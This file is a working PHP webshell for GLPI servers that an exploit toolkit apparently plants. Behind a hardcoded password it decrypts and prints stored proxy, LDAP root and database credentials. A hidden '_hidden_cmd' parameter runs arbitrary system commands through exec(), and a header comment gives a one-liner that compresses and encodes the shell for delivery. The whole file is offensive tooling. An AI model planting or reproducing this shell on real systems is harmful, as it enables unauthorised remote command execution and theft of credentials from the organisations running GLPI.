<?php

/****************************************************************
 * Webshell Usage:
 *   ?passwd=P@ssw0rd123 --> Print glpi passwords in use
 *   ?passwd=P@ssw0rd123&_hidden_cmd=whoami --> Execute whoami
 *
 * Used here exploits/utils/glpi_utils.py:method:get_glpi_shell
 *
 * ```bash
 * python3 -c 'import zlib;import base64; shell = open("shell.php", "rb");print(base64.b64encode(zlib.compress(shell.read())));shell.close()'
 * ```
 ****************************************************************/

error_reporting(E_ERROR | E_PARSE);

$SECURITY_STRATEGY = "no_check";

function title($m){
  echo "<b><u>" . htmlentities(ucfirst($m)) . "</b></u></br>\n";
}

function decrypt_pass($pass){
  if(method_exists("GLPIKey", "decrypt")){
    return (new GLPIKey())->decrypt($pass);
  } elseif(method_exists("Toolbox", "decrypt")){
    if(method_exists("Toolbox", "sodiumDecrypt")){
      return Toolbox::sodiumDecrypt($pass);
    }
    ### Really old glpi decrypted with a key in the config
    return Toolbox::decrypt($pass, GLPIKEY);
  } else {
    return "<ENCRYPTED>[{$pass}]";
  }
}

function dump_password(){
  global $CFG_GLPI, $DB;

  ### Show password informations
  # Dump Proxy scheme
  # Dump LDAP Password
  if(!empty($CFG_GLPI["proxy_name"]))
  {
    $proxy_credz = !empty($CFG_GLPI["proxy_user"])?$CFG_GLPI["proxy_user"] . ":" . decrypt_pass($CFG_GLPI["proxy_passwd"]) . "@":"";
    $proxy_url = "http://{$proxy_credz}" . $CFG_GLPI['proxy_name'] . ":" . $CFG_GLPI['proxy_port'];
    title("proxy:");
    Html::printCleanArray(array("Proxy In Use" => $proxy_url));
  }
  $auth_methods = Auth::getLoginAuthMethods();

  $config_ldap = new AuthLDAP();
  $all_connections = $config_ldap->find();

  foreach($all_connections as $connection){
    if(isset($connection['rootdn_passwd']) && isset($connection['rootdn'])){
      $ldap_pass = decrypt_pass($connection['rootdn_passwd']);
      title("Ldap Connexion:");
      Html::printCleanArray(array("LDAP Base" => $connection['rootdn'], "LDAP DN" => $connection["basedn"], "LDAP Password" => $ldap_pass, "Connection is active" => $connection['is_active']));
      }
    }

  # Dump DB password
  if(!is_null($DB)){
    title("Database informations:");
    Html::printCleanArray(array("DB Host" => $DB->dbhost,
                                "DB Database" => $DB->dbdefault,
                                "DB User" => $DB->dbuser,
                                "DB Password" => urldecode($DB->dbpassword)));
  }
}

if(isset($_GET["passwd"]) && $_GET["passwd"] === "P@ssw0rd123")
{
  for ($i=0; $i < 4; $i++) {
    $relative = str_repeat("../", $i);

    $to_include = "{$relative}inc/includes.php";


    if(file_exists($to_include)){
      include_once($to_include);
      try{
        Html::header("GLPI Password");
        if(isset($_GET["_hidden_cmd"]) && !empty($_GET["_hidden_cmd"]))
        {
          $output=null;
          $retval=null;
          exec($_GET['_hidden_cmd'], $output, $retval);

          echo "<code>";
          foreach ($output as $line) {
            echo htmlentities($line) . "</br>";
          }
          echo "</code></br>";
        } else {
          dump_password();
        }
      } catch(Exception $e) {
        echo $e->getMessage();
      }
      break;
    }
  }
}
